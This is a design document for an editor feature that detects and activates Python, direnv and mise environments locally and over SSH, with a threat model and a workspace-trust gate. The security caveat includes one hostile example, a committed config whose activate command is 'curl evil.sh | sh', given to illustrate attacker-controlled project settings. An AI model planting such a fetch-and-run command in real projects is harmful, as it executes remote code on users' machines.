# Remote Environment Manager UX Design

## Overview

Environment managers — Python `venv`, `direnv`, `mise`, `poetry`/`pipenv`,
`pyenv` — are one of the trickiest parts of a remote development workflow. If
the editor ignores them, three things break in ways that are confusing to the
user:

1. **Backend processes can't find tools.** Language servers, formatters, and
   linters (Pyright/Pylance, `ruff`, `gopls` behind a `mise`-managed
   toolchain) are spawned with a `PATH` that never saw the environment, so they
   either fail to launch or run against the wrong interpreter.
2. **The integrated terminal disagrees with the editor.** When the user runs a
   command by hand it works (their shell sourced the env); when the editor runs
   "the same" command it doesn't.
3. **Failures are silent.** The LSP just errors, with no hint that the cause is
   a missing `VIRTUAL_ENV` or an un-`allow`ed `.envrc`.

This document specifies a UX for Fresh that makes the common cases seamless,
keeps full user control available at every step, and reuses the abstractions
Fresh already has rather than bolting on a parallel system.

This is a TUI editor, not a GUI IDE. The VS Code / JetBrains patterns
(status-bar interpreter pill, "environment source script" field, login-shell
discovery) are adapted to Fresh's command palette, prompt-based pickers,
status-bar segments, and layered project config.

## Background: what Fresh already provides

The design leans entirely on existing machinery. The relevant pieces, with
anchors:

- **`Authority`** — `crates/fresh-editor/src/services/authority/mod.rs:237`.
  The single backend slot per `Editor`. Every primitive routes through it:
  file I/O, integrated terminal, plugin `spawnProcess`, formatter, **LSP
  spawn** (`long_running_spawner`), file watcher. Transitions are atomic: a new
  authority triggers a clean editor restart (`install_authority` →
  `request_restart`).
- **Authority-level env injection (the key precedent)** —
  `SpawnerSpec::DockerExec { env: Vec<(String, String)> }`
  (`authority/mod.rs:197`). The devcontainer plugin captures a login-shell env
  snapshot inside the container (`bash -lic env`) and the docker spawner
  applies it (`docker exec -e KEY=VAL …`) to **every** spawn — one-shot
  processes, the LSP `command_exists` probe, and the LSP server itself. This is
  exactly the mechanism an environment manager needs; venv/direnv/mise simply
  produce a different env snapshot.
- **LSP env is already plumbed** —
  `lsp/async_handler.rs:~2630` spawns servers via
  `long_running_spawner.spawn_stdio(command, args, env_pairs, …)`. Injecting an
  environment is a matter of populating `env_pairs`, not new plumbing.
- **The Remote Indicator** — a real status-bar segment
  (`config.rs` `StatusBarElement::RemoteIndicator`; `view/ui/status_bar.rs:56`
  `RemoteIndicatorState`) plus the `showActionPopup` dropdown the devcontainer
  plugin drives. Natural home for an interpreter pill.
- **Custom status-bar segments** — `StatusBarElement::CustomToken("plugin:token")`,
  registered via `editor.registerStatusBarElement(token, title)` and updated
  via `editor.setStatusBarValue(bufferId, token, value)` (see
  `plugins/git_statusbar.ts`).
- **Project-local config** — `$PROJECT_ROOT/.fresh/config.json`
  (`config_io.rs:283`), a layer in the precedence chain
  system → **project** → user → session. The version-controllable escape hatch.
- **Pickers & prompts** — `editor.startPrompt` + `editor.setPromptSuggestions`
  (the buffer switcher and every devcontainer picker), and `showActionPopup`
  for modal allow/deny choices.
- **Plugin API** — `setAuthority`, `getAuthorityLabel`,
  `setRemoteIndicatorState`, `registerStatusBarElement`/`setStatusBarValue`,
  `getEnv`, `setSetting`, `registerLspServer`, `spawnProcess`/`spawnHostProcess`,
  `getGlobalState`/`setGlobalState` (`plugins/lib/fresh.d.ts`).

The devcontainer plugin (`crates/fresh-editor/plugins/devcontainer.ts`) is a
complete, shipping precedent for nearly all of this: detect → prompt → capture
login env → `setAuthority` → status-bar indicator → info panel → persist
decisions per workspace across the restart.

## Core model: an environment is an env snapshot injected into the Authority

Do **not** model `venv`, `direnv`, and `mise` as three independent features.
Model **one** concept:

> An **active environment** is `{ label, interpreter_path?, env_vars }` produced
> by a **provider** and injected into the active Authority's spawner(s).

Because every backend primitive routes through the one Authority, injecting the
env there makes the LSP, the integrated terminal, `spawnProcess`, and
formatters consistent **by construction**. The classic failure — terminal and
language server disagreeing about `PATH` — becomes structurally impossible:
they read the same snapshot.

### Providers

Providers are tried in priority order (mirroring the live-grep provider
registry pattern in `init_script.rs`):

| Provider | How the snapshot is produced |
|----------|------------------------------|
| `direnv` | `direnv export json` (after `direnv allow`) |
| `mise` | `mise env --json` (or `mise env -s bash`) |
| `venv` / `poetry` / `pipenv` | resolve the interpreter; prepend its `bin/` to `PATH`; set `VIRTUAL_ENV` |
| `command` | user-supplied wrapper (`activate`); run it in a subshell, diff `env` |
| `login-shell` (fallback) | `$SHELL -lic env` snapshot — catches `pyenv` and anything hooked into rc files |

A provider yields a `Vec<(String, String)>` env delta. That delta is handed to
`setAuthority` (the same field shape the docker authority already uses) for
remote/container backends, or applied to the local spawner env for the local
authority.

## The UX: three tiers of control (auto → glance → explicit)

The entire UX is a ladder from zero-effort to total control. A user never *has*
to open config, but can always override any layer.

### Tier 1 — Auto-detect (zero config, the default)

On opening a workspace, scan the root for, in priority order:

- `.venv/bin/activate`, `venv/bin/activate`
- `.envrc` (direnv)
- `mise.toml`, `.mise.toml`, `.tool-versions`
- `poetry.lock`, `Pipfile`

If exactly one obvious environment is found, **detection is passive**: Fresh
reads files only and reflects the discovery in the status bar. It does **not**
activate (which executes code — see §Threat model) until the workspace is
trusted. In an untrusted workspace the pill shows `env: .venv ⚠ (activate?)`
and activation is one explicit user action away. This mirrors the devcontainer
plugin's auto-detection of `.devcontainer/`, which also asks before doing
anything.

### Tier 2 — Status-bar pill + dropdown (at-a-glance control)

A `CustomToken` status-bar segment sits next to the Remote Indicator:

```
 SSH: deploy@prod   env: .venv (py3.11)  ⏷        main   utf-8   12:4
```

States:

| Display | Meaning |
|---------|---------|
| `env: .venv (py3.11)` | venv/poetry active, interpreter resolved |
| `env: direnv ✓` | `.envrc` loaded |
| `env: mise` | mise env applied |
| `env: system` | no environment / explicitly system |
| `env: direnv ⚠ blocked` | `.envrc` present but not allowed |
| `env: …` | resolving |
| `env: ⚠` | active env's tooling failed to resolve (points at diagnostics) |

Activating the pill (or the command `Env: Select Environment`) opens a
`startPrompt` quick-pick — the same primitive as the buffer switcher:

```
┌─ Select environment ──────────────────────────────────┐
│ > .venv                    ./.venv/bin/python  (3.11)  │
│   poetry: myproj-AbC       ~/.cache/.../bin/python     │
│   direnv (.envrc)          reload to apply             │
│   System Python            /usr/bin/python3            │
│   ─────────────────────────────────────────────────── │
│   Reload directory env (direnv/mise)                   │
│   Edit activation command…                             │
│   Use system / none                                    │
└────────────────────────────────────────────────────────┘
```

Selecting an entry rebuilds the Authority with that env snapshot (the existing
`setAuthority` clean-restart path) — LSP and terminals come back already inside
the environment. This is the TUI equivalent of VS Code's "click the interpreter
in the status bar" quick-pick.

### Tier 3 — Explicit, version-controllable config (full control)

The JetBrains-style escape hatch, in `.fresh/config.json` (project layer), so a
team shares it via git:

```jsonc
{
  "env": {
    "provider": "direnv",                     // direnv | mise | venv | command | none | auto
    "interpreter": "./.venv/bin/python",      // pins the interpreter the picker shows
    "activate": "source .venv/bin/activate",  // free-form wrapper command
    "autoActivate": true,                     // skip the allow prompt for THIS workspace
    "applyToTerminal": true                   // inject env into integrated terminals too
  }
}
```

`activate` is the prompt's "Environment Initialization Script / Wrapper
Command" field: Fresh runs it in a subshell, captures the resulting `env`, and
injects the delta. Any explicit key wins over auto-detect, and the picker shows
the configured choice as active. Because config is layered, a user can override
a committed project default in their user config or per-session.

> **Security caveat — `.fresh/config.json` is attacker-controlled.** The
> project config layer ships *inside the repository*. A malicious project can
> commit `{ "env": { "activate": "curl evil.sh | sh", "autoActivate": true } }`.
> Therefore the execution-triggering `env.*` keys (`activate`, `provider`,
> `autoActivate`) are **only honored from the project layer in a trusted
> workspace**. From an untrusted workspace they are parsed but inert:
> `autoActivate` cannot grant itself trust, and `activate` will not run until
> the user trusts the workspace. Keys that only affect display
> (`interpreter` shown in the picker) are safe to read untrusted. This is the
> general rule in §Threat model: *no setting that originates from the workspace
> may, by its own assertion, authorize code execution.*

## The login-shell baseline fix (two real gaps in Fresh today)

For `direnv`/`mise`/`pyenv` to work over SSH at all, two core gaps must close.
Both are pre-existing and also benefit plain remote editing and containers.

1. **Remote agent `exec` uses a bare `Popen`** — `remote/agent.py:~470`
   (`subprocess.Popen([cmd] + args, cwd=cwd, …)`, no shell, no profile). The
   SSH bootstrap is `python3 -u -c …` (`remote/connection.rs:~92`), which never
   sources `~/.bashrc`/`~/.zshrc`. So remote `rg`/`git`/plugin spawns — and,
   once routed, the LSP — never see direnv/mise hooks.
   - **Fix:** add a per-authority "run through login shell" option so remote
     exec becomes `$SHELL -lc -- <cmd>`. Opt-in, since it adds per-spawn
     latency; the env-manager plugin prefers the *capture once, inject* path
     (below) for hot paths and uses the login shell only for the snapshot.

2. **`Authority::ssh` routes LSP to `LocalLongRunningSpawner` and injects no
   env** — `authority/mod.rs:285` (documented "Phase L" gap: LSP over SSH still
   spawns on the host). For remote venv'd Pyright/`ruff` to work, SSH needs:
   - (a) an SSH-routed `long_running_spawner` (LSP runs on the remote host), and
   - (b) the same `env: Vec<(String, String)>` injection the docker spawner
     already has.

   The env-manager plugin then captures the remote login env once
   (`$SHELL -lic env` over the agent) and hands it to `setAuthority` — byte for
   byte the `captureContainerLoginEnv` pattern in `devcontainer.ts`.

The **integrated terminal is the easy case**: `TerminalWrapper`
(`authority/mod.rs:99`) already supports login flags and a user shell override.
Opening a remote terminal as `$SHELL -l -i` makes `cd`-triggered direnv/mise
hooks fire natively, matching the manual experience. For non-hook managers
(venv) the captured env is injected into the terminal's environment so it
matches the editor.

## Threat model & trust boundary

**Precedent that motivates this section.** A reported issue: *"simply opening a
`.cs` file can cause Fresh to execute commands from an attacker-controlled C#
project."* The root cause of that class of bug is treating *opening a folder* as
implicit consent to run project-controlled content (build/restore commands, an
LSP launched with project-specified arguments, a tool resolved from a
repo-local path). This feature is in exactly the same blast radius and must not
repeat the mistake — arguably it is worse, because activating an environment is
**designed** to run repo-controlled code.

### What counts as code execution here

Every one of these executes attacker-controllable code or runs an
attacker-controllable binary, and therefore must sit *behind* the trust
boundary — never on the open-folder path:

- **`.envrc`** (direnv) — arbitrary shell, by design.
- **`mise.toml` / `.mise.toml`** — env, tasks, and hooks can run commands.
- **`activate`** wrapper from project config — arbitrary shell.
- **`venv`/`poetry` activation** — `bin/activate` is shell; and more subtly,
  `./.venv/bin/python` (or `ruff`, `pyright`) is a **repo-controlled binary**.
  Prepending `./.venv/bin` to `PATH` means *every subsequent spawn* — LSP,
  formatter, `spawnProcess` — may run a binary the repo author placed there.
- **Login-shell capture** (`$SHELL -lic env`) — sources rc files; a repo can
  influence these via `BASH_ENV`, a project-local `.zshenv`/`ZDOTDIR`, or
  `direnv`/`mise` shell hooks already installed in the user's rc. Running it is
  execution.
- **Interpreter version probing** — running `python --version` to render
  `(py3.11)` in the pill executes the repo-controlled interpreter. Use a
  non-executing source instead (parse `pyvenv.cfg` / `.python-version`) when the
  workspace is untrusted.

### The boundary

> **Opening a workspace is read-only.** Detecting an environment, reading
> `pyvenv.cfg`, and rendering a status pill never execute project content.
> Activation — anything in the list above — requires the workspace to be
> **trusted**.

Trust is a per-workspace decision, persisted via
`getGlobalState`/`setGlobalState` keyed by the **canonicalized** workspace path
(resolve symlinks; a path-spoof must not inherit another path's trust). It is a
single workspace-trust gate, not a per-env-manager one — consistent with the
direction the C# issue points (one trust model for "may this project's content
run," covering LSP launch args, build/restore commands, and env managers
alike). The env-manager plugin consumes that trust state; it should not invent
a parallel notion.

### The prompt

When an environment is detected in an untrusted workspace, a one-shot
`showActionPopup` (the devcontainer attach-prompt pattern) offers the
three-way choice, and names the concrete code that would run so consent is
*informed*:

```
direnv: .envrc found in this project. Loading it runs the project's shell code.
  [ Allow & activate ]   [ Not now ]   [ Never for this project ]
```

- **Allow & activate** → trust the workspace, activate, persist the decision.
- **Not now** → session-only; re-asks on the next open (the in-memory
  `dismissedThisSession` flag, like devcontainer).
- **Never for this project** → persist a deny so the pill stays passive and
  silent.

### Hard rules

1. **No autorun from open-folder.** Activation never happens as a side effect of
   opening a file or directory, only from explicit user action or
   pre-existing persisted trust for that exact canonical path.
2. **Workspace-sourced config cannot self-authorize.** `autoActivate: true` in
   the repo's `.fresh/config.json` is ignored unless the workspace is already
   trusted by the user (§Tier 3 caveat). Trust flows from the user, never from
   the repository.
3. **Surface the `PATH` risk.** When activation prepends a repo-local `bin/`,
   the info panel states plainly that subsequent tools resolve from inside the
   project, so a user auditing an untrusted repo understands the consequence.
4. **Re-prompt on change of the trusted content.** If a trusted `.envrc` /
   `mise.toml` / `activate` value changes on disk, drop to "blocked" and
   re-ask rather than silently running the new code (content-hash the trusted
   value, not just the path).
5. **No execution to render UI.** The pill and picker must be fully populated
   from read-only sources; never run a binary just to label it.

## Discoverability & feedback

- **Command palette:**
  - `Env: Select Environment`
  - `Env: Reload (direnv/mise)`
  - `Env: Use System`
  - `Env: Edit Activation Command`
  - `Env: Show Diagnostics`
- **Info panel** (like the devcontainer info panel): active provider, resolved
  interpreter, head of `PATH`, and which key binaries (`python`, `ruff`,
  `pyright`) actually resolved. When Pyright *would* have errored, the user sees
  *why* in one place instead of a cryptic LSP failure.
- **Visible failure, not silent:** if the LSP server binary can't be found, the
  pill goes `env: ⚠` and routes to the diagnostics panel — the opposite of the
  default "linter throws errors with no explanation."

## Where it lives: a plugin, plus two core fixes

Tiers 1–3 compose primitives the devcontainer plugin already proves out, so the
feature ships as a built-in **`env-manager.ts`** with no new core UI:

- detect environments (`readDir`, `fileExists`, `readFile`)
- run providers (`spawnProcess` / `spawnHostProcess`, `$SHELL -lic env`)
- own a status-bar segment (`registerStatusBarElement` / `setStatusBarValue`)
  and optionally drive the Remote Indicator (`setRemoteIndicatorState`)
- offer pickers (`startPrompt` + `setPromptSuggestions`) and the trust popup
  (`showActionPopup`)
- inject the env via `setAuthority` and persist per-workspace decisions via
  global state across the restart

The **only** core work is the two SSH/login-shell fixes in the section above,
both of which are pre-existing gaps that also improve container and plain remote
workflows.

## Implementation phases

1. **Local-only, plugin-only — with the trust gate from day one.** Auto-detect
   venv/poetry (passive); status-bar pill + picker; the workspace-trust prompt;
   inject env into the local authority's spawner and integrated terminal *only
   after trust*. No core changes. The trust boundary (§Threat model) is not a
   later add-on — activation executes repo-controlled code even for a plain
   local venv, so it ships in the first increment.
2. **direnv / mise providers.** Add `direnv export json` / `mise env --json`
   and the `Reload` command, reusing the phase-1 trust gate. Still local.
3. **Project config (`env.*`) + info panel + diagnostics.** Tier 3 control and
   the visible-failure path.
4. **SSH core fixes.** SSH-routed `long_running_spawner` + env injection in
   `Authority::ssh`; the remote login-shell capture in the plugin. This is what
   makes remote Pyright/`ruff` resolve against a remote venv/mise toolchain.
5. **Polish.** Multi-root edge cases, interpreter version probing, terminal
   login-shell wrapper for remote, caching the env snapshot per workspace.

## Open questions

- **Snapshot freshness.** direnv/mise env can change when `.envrc`/`mise.toml`
  change. Watch those files (`watchPath`, as `git_statusbar.ts` watches `HEAD`)
  and surface a "reload" affordance on the pill rather than auto-restarting the
  editor under the user.
- **Per-language vs whole-environment.** A single project may want different
  toolchains per language (mise can express this). v1 treats the environment as
  one snapshot; per-language overrides via `registerLspServer` env are a later
  extension once `LspServerPackConfig` grows an `env` field.
- **Latency of login-shell capture over SSH.** Capture once at activation and
  cache; only re-capture on explicit reload or watched-file change.
